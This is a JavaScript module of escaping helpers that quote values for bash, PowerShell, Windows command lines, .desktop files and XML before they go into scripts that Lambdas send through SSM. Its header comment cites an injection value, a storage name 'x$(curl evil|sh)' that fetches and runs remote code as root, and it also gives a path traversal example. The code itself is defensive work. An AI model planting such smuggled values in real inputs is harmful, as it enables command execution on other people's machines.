// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
// SPDX-License-Identifier: Apache-2.0

'use strict';

// Quoting for values pasted into scripts that run on a workstation as root or SYSTEM.
//
// Several Lambdas build a bash or PowerShell script as text and send it through SSM
// (`AWS-RunShellScript`, `AWS-RunPowerShellScript`). A value pasted into that text between
// double quotes is not inert: bash expands `$(...)` and backticks inside "...", PowerShell
// expands `$(...)` inside "...", and a newline ends the line it was meant to sit on. A storage
// name such as `x$(curl evil|sh)` therefore ran as root on every workstation it was mounted on.
//
// Every value that did not come from this file's caller as a constant goes through one of the
// functions below. Each produces a complete literal for one language, quotes included, so a call
// site writes `NAME=${sh(storage.name)}` and never puts quotes of its own around it.
//
// This file is copied byte-identical into every Lambda that builds a script, the way `authz.js`
// is; `test/script-quote.test.ts` exercises the copy in `lambda/s3-mount-manager` and holds that
// every other copy is the same file.

class UnsafeValueError extends Error {
  constructor(what, reason) {
    super(`${what} ${reason}`);
    this.name = 'UnsafeValueError';
  }
}

// C0 controls and DEL. A newline or carriage return would end a line of a unit file, a desktop
// file or a script; NUL truncates a C string. No storage name, path or bucket needs one.
const CONTROL = /[\u0000-\u001f\u007f]/;

/**
 * The value as text, refusing what no script line can carry.
 *
 * `null` and `undefined` are refused rather than turned into the words "null" and "undefined",
 * which is what a template literal would have pasted.
 */
function plain(value, what = 'value') {
  if (value === null || value === undefined) {
    throw new UnsafeValueError(what, 'is missing');
  }
  const text = String(value);
  if (CONTROL.test(text)) {
    throw new UnsafeValueError(what, 'contains a control character');
  }
  return text;
}

/**
 * A bash single-quoted literal. Nothing inside single quotes is special to bash; a single quote
 * itself is closed, escaped and reopened: `it's` becomes `'it'\''s'`.
 */
function sh(value, what) {
  return `'${plain(value, what).replace(/'/g, `'\\''`)}'`;
}

/**
 * A PowerShell single-quoted literal. Nothing inside is expanded; a quote is written twice.
 *
 * PowerShell also treats the typographic quotes U+2018 to U+201B as single quotes, so each of
 * those is doubled too, or `‘` would close the string as surely as `'` does.
 */
function ps(value, what) {
  return `'${plain(value, what).replace(/['\u2018\u2019\u201a\u201b]/g, '$&$&')}'`;
}

/**
 * One argument on a Windows command line, as `CommandLineToArgvW` and the C runtime split it.
 *
 * Always quoted. A quote is escaped with a backslash, and backslashes are doubled only where they
 * precede a quote, including the closing one — `C:\dir\` must not swallow it.
 */
function winArg(value, what) {
  const text = plain(value, what)
    .replace(/(\\*)"/g, '$1$1\\"')
    .replace(/(\\+)$/, '$1$1');
  return `"${text}"`;
}

/**
 * A file name made from a display name: no path separators, nothing Windows refuses, no leading
 * dot. `../../etc/cron.d/x` must name a file in the directory it is joined to, never escape it.
 */
function fileName(value, what = 'file name') {
  const cleaned = plain(value, what)
    .replace(/[\\/:*?"<>|]/g, '_')
    .replace(/^[.\s]+/, '')
    .trim()
    .slice(0, 120);
  return cleaned || 'storage';
}

/**
 * A value of type string in a freedesktop `.desktop` file: a backslash is written `\\`.
 */
function desktopString(value, what) {
  return plain(value, what).replace(/\\/g, '\\\\');
}

/**
 * One argument of a `.desktop` file's `Exec=` key.
 *
 * Quoted, with `"`, `` ` ``, `$` and `\` escaped by a backslash; and because the string escape
 * applies first, each of those backslashes is itself doubled. See the Desktop Entry
 * Specification, "The Exec key".
 */
function desktopExecArg(value, what) {
  const quoted = plain(value, what).replace(/["`$\\]/g, '\\$&');
  return `"${quoted.replace(/\\/g, '\\\\')}"`;
}

/**
 * A whole number, as digits. For a uid or gid read from a record: anything else is refused,
 * never pasted.
 */
function integer(value, what) {
  const text = plain(value, what);
  if (!/^\d{1,10}$/.test(text)) {
    throw new UnsafeValueError(what, 'is not a whole number');
  }
  return text;
}

/**
 * Text for an XML element or attribute, such as a launchd plist: `&`, `<`, `>`, `"` and `'`
 * become entities.
 */
function xml(value, what) {
  return plain(value, what).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;',
  })[c]);
}

/**
 * A Windows drive letter, one letter A to Z, upper-cased. Refused otherwise: a drive letter is
 * pasted where PowerShell reads bare words, and nothing else belongs there.
 */
function driveLetter(value, what = 'drive letter') {
  const text = plain(value, what).replace(/:$/, '').toUpperCase();
  if (!/^[A-Z]$/.test(text)) {
    throw new UnsafeValueError(what, 'is not a single letter A to Z');
  }
  return text;
}

module.exports = {
  UnsafeValueError,
  plain,
  sh,
  ps,
  winArg,
  fileName,
  desktopString,
  desktopExecArg,
  integer,
  xml,
  driveLetter,
};
